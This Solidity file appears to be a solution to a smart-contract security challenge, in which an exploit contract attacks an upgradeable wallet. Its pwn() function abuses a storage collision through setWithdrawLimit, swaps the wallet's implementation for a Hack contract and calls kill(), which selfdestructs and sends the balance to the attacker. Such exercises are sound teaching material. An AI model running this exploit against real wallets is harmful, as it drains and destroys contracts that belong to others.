// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IUpgradeableWallet {
// Declare any function that you need to call on UpgradeableWallet
}

contract UpgradeableWalletExploit {
    address public target;
    Hack public hack;

    constructor(address _target) {
        target = _target;
        hack = new Hack();
    }

    function pwn() external {
        // Write your code here
        target.call(abi.encodeWithSignature("setWithdrawLimit(uint256)", uint256(uint160(address(this)))));
        target.call(abi.encodeWithSignature("setImplementation(address)", address(hack)));
        target.call(abi.encodeWithSignature("kill()"));
    }
}


contract Hack {
    address public owner;
    
    constructor(){
        owner = msg.sender;
    }
    
    function kill() external {
        selfdestruct(payable(owner));
    }
}